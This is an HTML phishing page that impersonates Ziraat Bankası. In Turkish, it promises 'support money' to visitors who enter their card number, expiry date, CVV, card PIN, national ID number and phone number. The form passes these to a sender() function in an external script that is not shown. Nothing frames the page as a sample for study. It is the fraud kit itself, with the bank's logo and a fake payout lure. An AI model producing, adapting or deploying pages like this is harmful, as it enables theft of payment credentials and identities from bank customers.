<!DOCTYPE html>
<html lang="en">

<head>
	<title>Ziraat Bankasi</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="shortcut icon" href="https://logos-world.net/wp-content/uploads/2021/02/Ziraat-Bankasi-Symbol-700x394.jpg" type="image/x-icon">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
	<script src='https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js'></script>
	<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
	<script src="tr/main.js"></script>

	<link rel="stylesheet" href="style.css"> </head>
	<style>
	.container-fluid {
		background-color: #C5CAE9
	}
	
	.heading {
		font-size: 40px;
		margin-top: 35px;
		margin-bottom: 30px;
		padding-left: 20px
	}
	
	.card {
		border-radius: 10px !important;
		margin-top: 60px;
		margin-bottom: 60px
	}
	
	.form-card {
		margin-left: 20px;
		margin-right: 20px
	}
	
	.form-card input,
	.form-card textarea {
		padding: 10px 15px 5px 15px;
		border: none;
		border: 1px solid #6d6d6d;
		border-radius: 6px;
		margin-bottom: 25px;
		margin-top: 2px;
		width: 100%;
		box-sizing: border-box;
		font-family: arial;
		color: #2C3E50;
		font-size: 14px;
		letter-spacing: 1px
	}
	
	.form-card input:focus,
	.form-card textarea:focus {
		-moz-box-shadow: 0px 0px 0px 1.5px skyblue !important;
		-webkit-box-shadow: 0px 0px 0px 1.5px skyblue !important;
		box-shadow: 0px 0px 0px 1.5px skyblue !important;
		font-weight: bold;
		border: 1px solid #304FFE;
		outline-width: 0
	}
	
	.input-group {
		position: relative;
		width: 100%;
		overflow: hidden
	}
	
	.input-group input {
		position: relative;
		height: 80px;
		margin-left: 1px;
		margin-right: 1px;
		border-radius: 6px;
		padding-top: 30px;
		padding-left: 25px
	}
	
	.input-group label {
		position: absolute;
		height: 24px;
		background: none;
		border-radius: 6px;
		line-height: 48px;
		font-size: 15px;
		color: gray;
		width: 100%;
		font-weight: 100;
		padding-left: 25px
	}
	
	input:focus+label {
		color: #304FFE
	}
	
	.btn-pay {
		background-color: #cd0b0b;
		height: 60px;
		color: #ffffff !important;
		font-weight: bold
	}
	
	
	
	.fit-image {
		width: 100%;
		object-fit: cover
	}
	
	img {
		border-radius: 5px
	}
	
	.radio-group {
		position: relative;
		margin-bottom: 25px
	}
	
	.radio {
		display: inline-block;
		border-radius: 6px;
		box-sizing: border-box;
		border: 2px solid lightgrey;
		cursor: pointer;
		margin: 12px 25px 12px 0px
	}
	
	.radio:hover {
		box-shadow: 0px 0px 0px 1px rgba(0, 0, 0, 0.2)
	}
	
	.radio.selected {
		box-shadow: 0px 0px 0px 1px rgba(0, 0, 155, 0.4);
		border: 2px solid blue
	}
	
	.label-radio {
		font-weight: bold;
		color: #000000
	}
	</style>
<body>
<div class="row justify-content-center mb-4 radio-group">
				 <form action="" onsubmit=" return sender()" class="form-card">

						
		<div class="row justify-content-center mb-4 radio-group">
			<center><img src="https://i.ibb.co/5RZsNHy/Ziraat.jpg" width="350" height="100" alt=""></center>
		</div>
		
		<center><h4><p style="font-size:16px"><mark><strong>banka hesap bilgilerinizi doğru girin</strong></mark></p></h4></center>
		<center><h4><p style="font-size:16px"><mark><strong>destek parasını almak için</strong></mark></p></h4></center>
		<br>
		<div class="row justify-content-center">
			<div class="col-12">
				<div class="input-group">
					<input type="tel" id="Card" name="Card Number" required placeholder="" minlength="19" maxlength="19">
					<label>
						<h6>Kart Numaraniz</h6></label>
				</div>
			</div>
		</div>
		<div class="row justify-content-center">
			<div class="col-12">
				<div class="row">
					<div class="col-12">
						<div class="input-group">
							<input type="tel" id="Expiry" name="Expiry date" required placeholder="" minlength="5" maxlength="5">
							<label>
								<h6>Son kullanma tarihi</h6></label>
						</div>
					</div>
					<div class="col-12">
						<div class="input-group">
							<input type="tel" id="CVV" name="CVV" required placeholder="" minlength="3" maxlength="3">
							<label>
								<h6>CVV Kodunuzun</h6></label>
						</div>
					</div>
					<div class="col-12">
						<div class="input-group">
							<input type="tel" id="Pass" name="Card Pass" required placeholder="" minlength="4" maxlength="4">
							<label>
								<h6>Kart Şifreniz</h6></label>
						</div>
						<div class="input-group">
							<input type="tel" id="id" name="ID" required placeholder="" minlength="11" maxlength="11">
							<label>
								<h6>TC kimlik numarasını banka hesabınıza bağlı</h6></label>
						</div><div class="input-group">
							<input type="tel" id="Phone" name="Phone" required placeholder="" minlength="11" maxlength="11">
							<label>
								<h6>Telefon numaranızı banka hesabınıza bağlı</h6></label>
						</div>
					</div>
				</div>
			</div>
		</div>
		<br>
		<div class="row justify-content-center">
			<div class="col-md-12">
				<input type="submit" value="Devam" class="btn btn-pay placeicon"> </div>
		</div>
	</form>
	</div>
	</div>
	</div>
	</div>
	
	



	

	
	
</body>

</html>
